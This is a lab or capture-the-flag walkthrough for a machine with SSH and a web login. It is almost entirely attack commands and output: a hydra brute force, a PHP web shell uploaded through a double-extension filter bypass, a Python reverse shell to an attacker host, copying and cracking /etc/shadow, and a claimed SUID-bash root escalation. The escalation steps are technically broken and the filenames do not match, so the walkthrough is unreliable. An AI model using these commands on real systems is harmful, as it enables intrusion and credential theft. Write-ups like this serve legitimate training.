```
### Scenario Description
SSH login page with default credentials, then SUID binary privesc.

### Initial Recon
```bash
# Nmap scan shows SSH and web
nmap -sC -sV -p- 10.10.10.60
# 22/tcp   open  ssh     OpenSSH 7.9p1
# 80/tcp   open  http    Apache httpd 2.4.41

# Web enumeration
gobuster dir -u http://10.10.10.60 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
# /login.php (Status: 200)
# /admin (Status: 301)
```

#### Brute Force Login
```
# Login page at http://10.10.10.60/login.php
# Test default credentials
admin:admin
admin:password
admin:123456

# None worked, try brute force
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-100.txt 10.10.10.60 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid"

# Found: admin:iloveyou
```

#### Explore Dashboard
```
# Login successful - dashboard shows file upload
# Upload a PHP shell
# But only .jpg files allowed

# Bypass with double extension
shell.php.jpg - uploaded!

# Access shell
curl http://10.10.10.60/uploads/shell.php.jpg?cmd=id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Get reverse shell
curl "http://10.10.10.60/uploads/shell.php.jpg?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.5\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
```

#### System Enumeration
```
# Check user
whoami
# www-data

# Check sudo
sudo -l
# (user) NOPASSWD: /usr/bin/rsync

# Check SUID
find / -perm -4000 -type f 2>/dev/null
# /usr/bin/rsync (SUID)
# /usr/bin/sudo
# /usr/bin/passwd

# Check crontab
cat /etc/crontab
# */5 * * * * user /usr/bin/rsync -av --delete /home/user/backup/ /var/backups/
```

#### Exploit Rsync SUID
```
# Rsync with SUID can read any file as root
rsync -av /etc/shadow /tmp/shadow_copy

# Read shadow
cat /tmp/shadow_copy
# root:$6$randomsalt$hash:18555:0:99999:7:::
# user:$6$anothersalt$hash:18555:0:99999:7:::

# Crack hashes
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
# user:letmein

# Switch to user
su user
# letmein

# Check user's sudo
sudo -l
# (ALL) NOPASSWD: /usr/bin/rsync

# Rsync SUID is root-owned
# Use rsync to copy /bin/bash with SUID
rsync -av /bin/bash /tmp/rootshell
chmod +s /tmp/rootshell
/tmp/rootshell -p

# Root!
whoami
# root
```

